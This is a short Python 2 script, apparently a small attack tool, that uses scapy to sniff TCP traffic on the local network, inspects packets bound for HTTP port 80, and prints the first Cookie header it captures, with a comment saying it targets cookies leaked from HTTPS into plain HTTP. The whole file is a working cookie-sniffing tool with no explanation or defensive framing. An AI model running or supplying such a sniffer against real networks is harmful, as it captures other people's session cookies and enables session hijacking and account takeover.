from scapy.all import *
import logging
import urllib
import urllib2
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re

def packet_callback(packet):
    if packet[TCP].payload:
        pkt = str(packet[TCP].payload)
        if packet[IP].dport == 80:
            payload=str(bytes(packet[TCP].payload))
            # cookie leaked out from https secure channel into http
            for l in payload.split('\r\n'):
                if 'Cookie' in l:
                    print l
                    exit(0)

sniff(filter="tcp", prn=packet_callback, store=0)



